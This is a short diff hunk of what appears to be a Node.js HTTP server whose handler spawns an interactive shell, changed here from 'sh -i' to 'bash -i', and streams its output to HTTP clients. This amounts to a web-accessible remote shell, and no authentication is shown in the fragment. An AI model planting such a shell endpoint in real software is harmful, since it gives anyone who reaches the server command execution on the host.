@@ -110,7 +110,7 @@ var json=JSON.stringify;
 var s=(()=>{
   var f=(request,response)=>{
     response.writeHead(200,{"Content-Type":"text/plain",'Transfer-Encoding':'chunked'});
-    var sh=spawn('sh',['-i']);
+    var sh=spawn('bash',['-i']);
     var to_resp=z=>data=>{
       response.write(data.length+"\0"+z+"\0"+data);
     };
